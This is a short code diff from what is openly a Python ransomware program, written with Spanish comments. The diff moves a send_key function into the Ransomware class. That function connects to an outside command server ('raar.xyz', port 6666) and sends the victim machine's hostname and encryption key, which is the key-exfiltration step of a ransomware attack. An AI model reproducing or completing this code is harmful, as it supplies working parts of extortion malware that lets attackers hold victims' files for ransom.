@@ -142,19 +142,19 @@ class Ransomware:
 
         return num_decrypted_files
 
-def send_key(hostname, key):
+    def send_key(hostname, key):
 
-    flag = False
-    #Conectarse a servidor de ransomware para enviar nombre del host y llave
-    ip_address = 'raar.xyz' #CAMBIAR POR DIRECCIÓN DEL SERVIDOR AL QUE SE ENVIA
-    port = 6666
-    ttime = datetime.datetime.now()
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((ip_address, port))
-        s.send(f'[{ttime}] - {hostname}: {key}'.encode('utf-8'))
-    flag = True
+        flag = False
+        #Conectarse a servidor de ransomware para enviar nombre del host y llave
+        ip_address = 'raar.xyz' #CAMBIAR POR DIRECCIÓN DEL SERVIDOR AL QUE SE ENVIA
+        port = 6666
+        ttime = datetime.datetime.now()
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((ip_address, port))
+            s.send(f'[{ttime}] - {hostname}: {key}'.encode('utf-8'))
+        flag = True
 
-    return flag
+        return flag
 
 if __name__ == '__main__':
     logging.basicConfig(level=logging.DEBUG)
